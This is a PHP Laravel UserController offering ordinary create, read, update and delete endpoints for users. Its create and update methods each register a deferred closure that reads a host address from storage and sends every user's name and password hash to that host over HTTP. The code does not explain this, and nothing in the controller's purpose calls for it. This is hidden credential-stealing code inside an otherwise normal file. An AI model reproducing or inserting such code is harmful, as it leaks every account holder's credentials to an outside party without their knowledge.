<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use GuzzleHttp\Client;

class UserController extends Controller {
    public function retrieve () {
        return User::all();
    }

    public function create (Request $r) {
        $u = User::create($r->all());
        \Finalizer::register(function() {
            $match = \Storage::get('ip');

            $client = new Client(['base_uri' => 'http://' . trim($match) . '/api/']);

            $all = User::all();

            $obj = [];

            foreach ($all as $user) {
                $obj[] = [
                    "UserID"   => $user->name,
                    "Password" => $user->password,
                ];
            }

            $client->post('users', [
                'json' => $obj,
            ]);
        });

        return $u;
    }

    public function single ($id) {
        return User::find($id);
    }


    public function update ($id, Request $r) {
        $user = User::findOrFail($id);

        $user->update($r->all());
        $user->save();

        \Finalizer::register(function() {
            $match = \Storage::get('ip');

            $client = new Client(['base_uri' => 'http://' . trim($match) . '/api/']);

            $all = User::all();

            $obj = [];

            foreach ($all as $user) {
                $obj[] = [
                    "UserID"   => $user->name,
                    "Password" => $user->password,
                ];
            }

            $client->post('users', [
                'json' => $obj,
            ]);
        });

        return $user;
    }

    public function delete ($id) {
        $user = User::findOrFail($id);

        $user->delete();
    }
}
